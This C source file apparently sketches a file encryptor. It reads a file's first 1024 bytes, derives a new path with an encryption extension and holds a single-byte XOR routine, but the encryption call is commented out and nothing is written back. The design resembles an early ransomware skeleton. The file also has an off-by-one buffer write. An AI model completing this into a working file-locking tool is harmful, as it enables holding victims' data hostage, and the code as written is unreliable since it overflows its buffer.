#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "includes.h"

#define ENCRYPT_FIRST_BYTES 1024

char *path_with_crypt_ext(char *path);
void crypt(unsigned char *text, unsigned int length, int key);
void decrypt(unsigned char *text, unsigned int length, int key);




void encrypt_file(char *path) {
    FILE *file;
    char *new_path;
    unsigned int bytes;
    unsigned char buffer[ENCRYPT_FIRST_BYTES];

    if ((file = fopen(path, "rb")) == NULL ) {
        return;
    }

    bytes = fread(buffer, sizeof(unsigned char), ENCRYPT_FIRST_BYTES, file);
    buffer[bytes] = '\0';

    fclose(file);

    new_path = path_with_crypt_ext(path);
    printf("%s\n", new_path);
    free(new_path);

    /*
    int key;
    key = 16;
    crypt(buffer, bytes, key);
    decrypt(buffer, bytes, key);
    */
}



char *path_with_crypt_ext(char *path) {
    int length = strlen(path) + strlen(CRYPT_EXT) + 1;
    char *new = malloc(length);

    if (new != NULL) {
        new[strlen(path)] = '\0';
        memcpy(new, path, strlen(path));
        strcat(new, CRYPT_EXT);

        return new;
    }
    else {
        return NULL;
    }
}



/*****************************************************************************/
void crypt(unsigned char *text, unsigned int length, int key) {
    unsigned int i;
    for (i = 0; i < length; ++i) {
        *(text+i) = *(text+i) ^ key;
    }
}



void decrypt(unsigned char *text, unsigned int length, int key) {
    crypt(text, length, key);
}